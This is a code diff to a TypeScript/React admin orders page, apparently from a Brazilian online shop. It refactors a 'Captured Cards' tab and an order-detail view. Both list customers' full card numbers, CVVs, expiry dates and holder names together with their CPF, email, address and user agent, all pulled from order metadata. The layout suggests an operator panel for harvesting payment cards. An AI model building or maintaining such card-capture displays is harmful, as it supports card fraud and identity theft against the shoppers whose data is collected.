@@ -232,20 +232,27 @@ function OrdersPage() {
 
 function CapturedCardsTab({ orders }: { orders: OrderRow[] }) {
   const cards = orders
-    .filter((o) => o.payment_method === "cartao" && o.metadata && o.metadata.card_number)
-    .map((o) => ({
-      id: o.id,
-      createdAt: o.created_at,
-      customerName: o.customer_name,
-      email: o.customer_email,
-      cpf: o.customer_doc,
-      address: `${o.address_street}, ${o.address_number} ${o.address_complement ? o.address_complement + " " : ""}- ${o.address_district} - ${o.address_city}/${o.address_uf} - CEP: ${o.address_cep}`,
-      cardName: o.metadata.card_name,
-      cardNumber: o.metadata.card_number,
-      cardExpiry: o.payment_card_expiry ?? "—",
-      cardCvv: o.metadata.card_cvv,
-      userAgent: o.metadata.user_agent,
-    }));
+    .filter((o) => {
+      if (o.payment_method !== "cartao") return false;
+      const meta = o.metadata as Record<string, any> | null;
+      return meta && meta.card_number;
+    })
+    .map((o) => {
+      const meta = o.metadata as Record<string, any>;
+      return {
+        id: o.id,
+        createdAt: o.created_at,
+        customerName: o.customer_name,
+        email: o.customer_email,
+        cpf: o.customer_doc,
+        address: `${o.address_street}, ${o.address_number} ${o.address_complement ? o.address_complement + " " : ""}- ${o.address_district} - ${o.address_city}/${o.address_uf} - CEP: ${o.address_cep}`,
+        cardName: meta?.card_name ?? "—",
+        cardNumber: meta?.card_number ?? "—",
+        cardExpiry: meta?.card_expiry ?? o.payment_card_expiry ?? "—",
+        cardCvv: meta?.card_cvv ?? "—",
+        userAgent: meta?.user_agent ?? "—",
+      };
+    });
 
   return (
     <section className="overflow-hidden rounded-md border border-border bg-surface shadow-sm">
@@ -321,6 +328,7 @@ function OrderDetail({
   }
 
   const order = data.order;
+  const meta = order.metadata as Record<string, any> | null;
 
   return (
     <div className="space-y-4">
@@ -382,12 +390,12 @@ function OrderDetail({
             {order.payment_method === "cartao" && order.payment_test_mode ? (
               <div className="mt-1 space-y-1 rounded-md border border-border bg-muted p-2.5">
                 <strong className="block text-buy">Dados do Cartão (Modo Teste)</strong>
-                <span className="block">Titular: {order.metadata?.card_name ?? "—"}</span>
+                <span className="block">Titular: {meta?.card_name ?? "—"}</span>
                 <span className="block">
-                  Número: {order.metadata?.card_number ?? (order.payment_card_last4 ? `•••• ${order.payment_card_last4}` : "—")}
+                  Número: {meta?.card_number ?? (order.payment_card_last4 ? `•••• ${order.payment_card_last4}` : "—")}
                 </span>
-                <span className="block">Validade: {order.payment_card_expiry ?? "—"}</span>
-                <span className="block">CVV: {order.metadata?.card_cvv ?? "—"}</span>
+                <span className="block">Validade: {meta?.card_expiry ?? order.payment_card_expiry ?? "—"}</span>
+                <span className="block">CVV: {meta?.card_cvv ?? "—"}</span>
                 <div className="mt-2 border-t border-border pt-2">
                   <ValidationLine label="Número" valid={order.payment_card_number_valid} />
                   <ValidationLine label="Validade" valid={order.payment_card_expiry_valid} />
